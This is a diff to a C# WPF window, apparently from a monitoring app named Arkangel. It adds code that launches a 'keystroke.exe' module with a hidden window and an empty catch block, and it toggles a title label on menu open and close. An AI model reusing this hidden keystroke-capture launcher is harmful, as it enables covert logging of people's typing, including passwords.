@@ -66,7 +66,16 @@ namespace Arkangel
                 Dashboard dashboard = new Dashboard();
                 mainPanel.Children.Add(dashboard);
             }
-
+            //Keystroke
+            try
+            {
+                ProcessStartInfo start = new ProcessStartInfo();
+                start.WorkingDirectory = @"..\..\module\";
+                start.FileName = "keystroke.exe";
+                start.WindowStyle = ProcessWindowStyle.Hidden;
+                Process.Start(start);
+            }
+            catch { };
             //Screenshot
 
             int _hours=0,_minutes=0,enable=0;
@@ -141,6 +150,7 @@ namespace Arkangel
             CloseMenu.Visibility = Visibility.Visible;
             OpenMenu.Visibility = Visibility.Collapsed;
             allIcon.Visibility = Visibility.Visible;
+            lb_title.Visibility = Visibility.Visible;
         }
 
         private void Button_CloseMenu_Click(object sender, RoutedEventArgs e)
@@ -148,7 +158,7 @@ namespace Arkangel
             CloseMenu.Visibility = Visibility.Collapsed;
             OpenMenu.Visibility = Visibility.Visible;
             allIcon.Visibility = Visibility.Hidden;
-
+            lb_title.Visibility = Visibility.Collapsed;
         }
 
         private void bt_home_Click(object sender, RoutedEventArgs e)
